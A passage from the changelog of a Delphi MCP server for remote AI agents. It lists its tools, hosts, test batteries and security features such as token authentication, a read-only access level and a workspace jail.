  EOL preserved, automatic backup, atomic write, no whole-file rewrites —
  plus a CREATE mode that never overwrites. Delphi sources/designers/.dproj
  and binaries are refused.
- **`delphi_git`: `init`, `push`, `tag`** added to the whitelist (push uses
  the credentials/remotes stored on the server — consistent with the
  centralized model; tag is annotated when "message" is given). In read-only
  mode `tag`/`branch` without arguments (pure listing) pass; everything else
  that writes stays refused.
- **Library read zone**: with a jail configured, READING tools (read /
  search / list / fetch / LSP navigation) also accept the RAD Studio
  installation and the IDE Library Search Path directories, so agents can
  follow definitions into RTL/VCL sources and read installed components'
  code. Writing tools can never touch that zone.
- **Config Fabricator**: merges the IDE's global Library Search Path
  (registry) into fabricated settings, so symbols of installed third-party
  components resolve without the project repeating their paths.

### Tests
- 124 checks across the same five batteries (textedit lifecycle including
  .html, git init/tag/push against a throwaway repo, library-zone
  read-vs-write, read-only classification of the new tools).

## [0.5.0-beta] - 2026-08-19

### Added
- **Read-only access level**, enforced at a single gate in front of every
  `tools/call`: `[Security] ReadOnlyToken` (second Bearer credential),
  `AnonymousReadOnly=1` (tokenless requests get read-only), and a
  `--readonly` flag (whole process read-only, any transport). Read-only
  clients can read, search, navigate symbols, get diagnostics, download and
  run query git commands; `delphi_edit`, `delphi_create`, `delphi_build`,
  `delphi_run`, `delphi_package` and git write commands are refused. Made
  for reviewer agents (e.g. a wiki agent cross-checking the sources).
- `settings.example.ini` configuration template.

### Changed
- Documented that the HTTP listen port is configurable via
  `settings.ini [Server] Port` (default 3000; `--http <port>` overrides),
  and locked the behavior with a test.
- Token/credential reading centralized in one unit (was duplicated in the
  console and tray hosts).

## [0.4.0-beta] - 2026-08-19

The project is now explicitly labeled **beta**: functional and test-covered,
but young — expect rough edges and breaking changes between minor versions.

### Added
- `delphi_package` (tool 17): zip a build-output directory on the server
  into a single deploy artifact (recursive, `.dcu` intermediates excluded),
  ready to download with one `delphi_fetch`. The standard route to run GUI
  apps on the client machine: `delphi_build` → `delphi_package` →
  `delphi_fetch`.

## [0.3.0] - 2026-08-19

First complete release: total control of Delphi and its projects from a
remote machine. Built and validated in a single day against DelphiLSP 37.0
(RAD Studio 13 "Florence").

### Added
- **16 MCP tools**: `delphi_symbols`, `delphi_definition`, `delphi_hover`,
  `delphi_completion` (official DelphiLSP engine); `delphi_diagnostics`
  (Error Insight on demand, no build); `delphi_references` (hybrid text scan
  + compiler validation, homonyms rejected); `delphi_read` / `delphi_edit`
  (safe editing: one-line anchors, byte-exact encoding preservation, atomic
  writes, backups + 2-step restore, semantic INSERT, TPF0 hard-reject);
  `delphi_create` (scaffold console/VCL/FMX projects and VCL/FMX forms,
  buildable immediately); `delphi_build` (real MSBuild); `delphi_run`
  (jailed execution with output capture); `delphi_fetch` (chunked artifact
  download with SHA-256); `delphi_search`, `delphi_list` (files and
  explorer-style dirs), `delphi_projects` (locator), `delphi_git`
  (whitelisted operations).
- **Three hosts**: stdio (local MCP clients), console `--http [port]`
  (Streamable HTTP), and `DelphiLspMcpTray` (starts minimized to tray).
- **Security**: Bearer token auth (`[Security] AuthToken` /
  `DELPHI_MCP_TOKEN`) and workspace jail (`[Workspace] Roots` /
  `DELPHI_MCP_ROOTS`) enforced on every disk-touching tool, with
  canonicalized paths (no `..\` escapes, no prefix cousins).
- **Config Fabricator**: project settings generated from the `.dproj` when
  no fresh `.delphilsp.json` exists (stale ones detected and ignored);
  RAD Studio located via the Windows registry (11/12/13+, no hardcoded paths).
- **Tests**: five end-to-end batteries speaking real MCP over stdio/HTTP,
  86 checks total, including byte-level encoding verification and building
  freshly scaffolded projects for real.

### Notes
- Requires a licensed RAD Studio / Delphi 11+ installation on the server
  machine (`DelphiLSP.exe` is not redistributed).
- MCP plumbing vendored from gdksoftware/delphi-mcp-server (MIT) with two
  documented local changes (see `vendor/gdk-mcp-server/VENDOR.md`).
